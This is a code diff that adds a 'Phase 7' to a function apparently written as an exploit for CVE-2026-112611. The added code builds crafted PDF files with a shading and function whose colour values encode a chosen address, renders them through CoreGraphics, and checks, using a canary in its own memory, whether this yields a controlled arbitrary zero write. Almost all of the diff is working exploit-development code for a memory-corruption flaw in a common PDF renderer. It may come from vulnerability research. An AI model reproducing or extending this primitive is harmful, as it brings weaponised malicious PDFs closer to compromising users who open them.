@@ -31328,13 +31328,216 @@ static void r508_exploit(void) {
         sigaction(SIGBUS, &sa_old_bus, NULL);
     }
 
-    rlog("\n  Phase 6 complete\n\n");
+    rlog("\n  Phase 6 (index scan) complete — see results above\n\n");
     fflush(stdout);
 
-    rlog("=== SUMMARY ===\n");
-    rlog("  Phase 5: Signal handler caught crash at FAR=0x%llx\n",
-        (unsigned long long)r508_fault_addr);
-    rlog("  Phase 6: Index scan for x22 control\n\n");
+    /* ---- Phase 7: Uniform-value test — controlled zero write ---- */
+    rlog("--- Phase 7: Uniform-value zero write (all C0/C1 = target) ---\n");
+    rlog("  When ALL outputs have the same double X, x22=X, and\n");
+    rlog("  str wzr,[x22,#0xc] writes 4 zero bytes to X+0xc.\n\n");
+    fflush(stdout);
+
+    /* Test A: Unmapped addresses — verify FAR = target+0xc */
+    uint64_t test_targets[] = {
+        0x4141414100000000ULL,
+        0x0000DEAD00000000ULL,
+        0x0000000100000000ULL,
+    };
+    int n_targets = (int)(sizeof(test_targets) / sizeof(test_targets[0]));
+
+    for (int t = 0; t < n_targets; t++) {
+        uint64_t tgt = test_targets[t];
+        r508_fault_caught = 0;
+        r508_fault_addr = 0;
+        sigaction(SIGSEGV, &sa_new, NULL);
+        sigaction(SIGBUS, &sa_new, NULL);
+
+        if (sigsetjmp(r508_jmpbuf, 1) == 0) {
+            /* Build uniform PDF: all R=136 outputs = tgt */
+            int R7 = 136;
+            char *c7 = (char *)malloc((size_t)(R7 * 80 + 64));
+            int c7l = 0;
+            double v7; memcpy(&v7, &tgt, 8);
+            for (int i = 0; i < R7; i++) {
+                if (i > 0) c7[c7l++] = ' ';
+                c7l += snprintf(c7 + c7l, 79, "%.17g", v7);
+            }
+            char *rn7 = (char *)malloc((size_t)(R7 * 120 + 64));
+            int rn7l = 0;
+            for (int i = 0; i < R7; i++) {
+                if (i > 0) rn7[rn7l++] = ' ';
+                rn7l += snprintf(rn7 + rn7l, 119,
+                    "-1000000000000000000000000000000 1000000000000000000000000000000");
+            }
+            uint8_t m7[36]; int m7o = 0, m7b = 0;
+            uint32_t co7[][2] = {{0x10000000,0x10000000},{0x20000000,0x10000000},
+                                 {0x10000000,0x20000000},{0x20000000,0x20000000}};
+            for (int v = 0; v < 4; v++) {
+                pdf_put_bits(m7, &m7o, &m7b, co7[v][0], 32);
+                pdf_put_bits(m7, &m7o, &m7b, co7[v][1], 32);
+                pdf_put_bits(m7, &m7o, &m7b, 0x80, 8);
+            }
+            if (m7b > 0) m7o++;
+            size_t cap7 = (size_t)(c7l * 2 + rn7l + m7o + 4096);
+            char *p7 = (char *)malloc(cap7);
+            int pl = 0;
+            pl += snprintf(p7+pl, cap7-(size_t)pl, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+            int o1=pl; pl += snprintf(p7+pl, cap7-(size_t)pl, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+            int o2=pl; pl += snprintf(p7+pl, cap7-(size_t)pl, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+            int o3=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+                "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+                "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+            int o4=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+                "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
+            int o6=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+                "6 0 obj\n<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%s] /C1 [%s] /Range [%s] >>\nendobj\n",
+                c7, c7, rn7);
+            int o5=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+                "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceGray "
+                "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow 2 "
+                "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>\nstream\n", m7o);
+            memcpy(p7+pl, m7, (size_t)m7o); pl += m7o;
+            pl += snprintf(p7+pl, cap7-(size_t)pl, "\nendstream\nendobj\n");
+            int xo=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+                "xref\n0 7\n0000000000 65535 f \n"
+                "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n"
+                "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n"
+                "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n",
+                o1, o2, o3, o4, o5, o6, xo);
+
+            CFDataRef pd7 = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)p7, (CFIndex)pl);
+            CGDataProviderRef dp7 = CGDataProviderCreateWithCFData(pd7);
+            CGPDFDocumentRef dc7 = CGPDFDocumentCreateWithProvider(dp7);
+            if (dc7) {
+                CGPDFPageRef pg7 = CGPDFDocumentGetPage(dc7, 1);
+                if (pg7) {
+                    CGColorSpaceRef cs7 = CGColorSpaceCreateDeviceRGB();
+                    uint32_t *px7 = (uint32_t *)calloc(64 * 64, 4);
+                    CGContextRef cx7 = CGBitmapContextCreate(px7, 64, 64, 8, 64*4, cs7,
+                        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+                    CGContextDrawPDFPage(cx7, pg7);
+                    rlog("  target=0x%016llx => SURVIVED (write may have succeeded!)\n",
+                        (unsigned long long)tgt);
+                    CGContextRelease(cx7); CGColorSpaceRelease(cs7); free(px7);
+                }
+                CGPDFDocumentRelease(dc7);
+            }
+            CGDataProviderRelease(dp7); CFRelease(pd7);
+            free(p7); free(c7); free(rn7);
+        } else {
+            uint64_t expected = test_targets[t] + 0xc;
+            int hit = (r508_fault_addr == expected);
+            rlog("  target=0x%016llx => CRASH far=0x%016llx expected=0x%016llx %s\n",
+                (unsigned long long)test_targets[t],
+                (unsigned long long)r508_fault_addr,
+                (unsigned long long)expected,
+                hit ? "*** EXACT MATCH ***" : "");
+        }
+        fflush(stdout);
+        sigaction(SIGSEGV, &sa_old_segv, NULL);
+        sigaction(SIGBUS, &sa_old_bus, NULL);
+    }
+
+    /* Test B: Write to our OWN writable memory */
+    rlog("\n  Test B: Targeting canary in own process memory...\n");
+    static volatile uint32_t r508_canary = 0xCAFEBABE;
+    uint64_t canary_addr = (uint64_t)(uintptr_t)&r508_canary;
+    uint64_t x22_val = canary_addr - 0xc;
+    rlog("  canary at %p = 0x%08x, x22 target = 0x%llx\n",
+        (void *)&r508_canary, r508_canary, (unsigned long long)x22_val);
+
+    r508_fault_caught = 0;
+    r508_fault_addr = 0;
+    sigaction(SIGSEGV, &sa_new, NULL);
+    sigaction(SIGBUS, &sa_new, NULL);
+
+    if (sigsetjmp(r508_jmpbuf, 1) == 0) {
+        int R7 = 136;
+        char *c7 = (char *)malloc((size_t)(R7 * 80 + 64));
+        int c7l = 0;
+        double v7; memcpy(&v7, &x22_val, 8);
+        for (int i = 0; i < R7; i++) {
+            if (i > 0) c7[c7l++] = ' ';
+            c7l += snprintf(c7 + c7l, 79, "%.17g", v7);
+        }
+        char *rn7 = (char *)malloc((size_t)(R7 * 120 + 64));
+        int rn7l = 0;
+        for (int i = 0; i < R7; i++) {
+            if (i > 0) rn7[rn7l++] = ' ';
+            rn7l += snprintf(rn7 + rn7l, 119,
+                "-1000000000000000000000000000000 1000000000000000000000000000000");
+        }
+        uint8_t m7[36]; int m7o = 0, m7b = 0;
+        uint32_t co7[][2] = {{0x10000000,0x10000000},{0x20000000,0x10000000},
+                             {0x10000000,0x20000000},{0x20000000,0x20000000}};
+        for (int v = 0; v < 4; v++) {
+            pdf_put_bits(m7, &m7o, &m7b, co7[v][0], 32);
+            pdf_put_bits(m7, &m7o, &m7b, co7[v][1], 32);
+            pdf_put_bits(m7, &m7o, &m7b, 0x80, 8);
+        }
+        if (m7b > 0) m7o++;
+        size_t cap7 = (size_t)(c7l * 2 + rn7l + m7o + 4096);
+        char *p7 = (char *)malloc(cap7);
+        int pl = 0;
+        pl += snprintf(p7+pl, cap7-(size_t)pl, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+        int o1=pl; pl += snprintf(p7+pl, cap7-(size_t)pl, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+        int o2=pl; pl += snprintf(p7+pl, cap7-(size_t)pl, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+        int o3=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+            "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+            "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+        int o4=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+            "4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n");
+        int o6=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+            "6 0 obj\n<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%s] /C1 [%s] /Range [%s] >>\nendobj\n",
+            c7, c7, rn7);
+        int o5=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+            "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceGray "
+            "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow 2 "
+            "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>\nstream\n", m7o);
+        memcpy(p7+pl, m7, (size_t)m7o); pl += m7o;
+        pl += snprintf(p7+pl, cap7-(size_t)pl, "\nendstream\nendobj\n");
+        int xo=pl; pl += snprintf(p7+pl, cap7-(size_t)pl,
+            "xref\n0 7\n0000000000 65535 f \n"
+            "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n"
+            "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n"
+            "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n",
+            o1, o2, o3, o4, o5, o6, xo);
+
+        CFDataRef pd7 = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)p7, (CFIndex)pl);
+        CGDataProviderRef dp7 = CGDataProviderCreateWithCFData(pd7);
+        CGPDFDocumentRef dc7 = CGPDFDocumentCreateWithProvider(dp7);
+        if (dc7) {
+            CGPDFPageRef pg7 = CGPDFDocumentGetPage(dc7, 1);
+            if (pg7) {
+                CGColorSpaceRef cs7 = CGColorSpaceCreateDeviceRGB();
+                uint32_t *px7 = (uint32_t *)calloc(64 * 64, 4);
+                CGContextRef cx7 = CGBitmapContextCreate(px7, 64, 64, 8, 64*4, cs7,
+                    (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+                CGContextDrawPDFPage(cx7, pg7);
+                rlog("  SURVIVED! canary after render: 0x%08x (was 0xCAFEBABE)\n", r508_canary);
+                if (r508_canary == 0x00000000) {
+                    rlog("  *** CANARY ZEROED! Arbitrary zero write CONFIRMED! ***\n");
+                } else if (r508_canary != 0xCAFEBABE) {
+                    rlog("  *** CANARY CHANGED to 0x%08x! ***\n", r508_canary);
+                } else {
+                    rlog("  Canary unchanged\n");
+                }
+                CGContextRelease(cx7); CGColorSpaceRelease(cs7); free(px7);
+            }
+            CGPDFDocumentRelease(dc7);
+        }
+        CGDataProviderRelease(dp7); CFRelease(pd7);
+        free(p7); free(c7); free(rn7);
+    } else {
+        rlog("  CRASH targeting canary: FAR=0x%llx expected=0x%llx\n",
+            (unsigned long long)r508_fault_addr, (unsigned long long)canary_addr);
+    }
+
+    sigaction(SIGSEGV, &sa_old_segv, NULL);
+    sigaction(SIGBUS, &sa_old_bus, NULL);
+
+    rlog("\n  Phase 7 complete\n\n");
+    fflush(stdout);
 
     rlog("=== r508 (CVE-2026-112611) complete ===\n\n");
     fflush(stdout);
